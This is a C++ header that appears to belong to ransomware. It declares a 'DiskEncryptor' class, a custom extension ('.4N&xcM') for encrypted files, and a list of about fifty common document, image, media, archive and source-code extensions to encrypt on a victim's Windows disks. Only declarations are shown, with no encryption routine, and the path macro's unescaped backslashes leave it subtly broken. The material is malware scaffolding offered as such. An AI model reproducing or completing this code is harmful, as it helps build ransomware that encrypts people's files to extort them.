#include <string>


#include "headers.h"

#define TABLE_TEMP_FILE(username) "C:\Users\." username "\AppData\Local\Temp"
#define FILE_EXTENSION ".4N&xcM"

const std::string ext2Ecrypt[] = {
".zip", ".rar", ".pdf", ".img", ".jpeg", ".png", ".docx", ".xlsx",
".pptx", ".txt", ".csv", ".mp3", ".wav", ".mp4", ".avi", ".mov",
".mkv", ".jpg", ".gif", ".bmp", ".html", ".css", ".js", ".xml",
".json", ".sql", ".log", ".ini", ".cfg", ".sh", ".py", ".cpp", ".h",
".java", ".class", ".jar", ".php", ".asp", ".jsp", ".c", ".cs", ".pl",
".rb", ".psd", ".ai", ".eps", ".svg", ".tiff", ".tif"
};

class DiskEncryptor
{

private:

	std::string disks;
	long long freespace;
	int numberOfFiles;


public:

	DiskEncryptor(std::string disks);
	~DiskEncryptor();

	bool setFileExtension();



	
	

};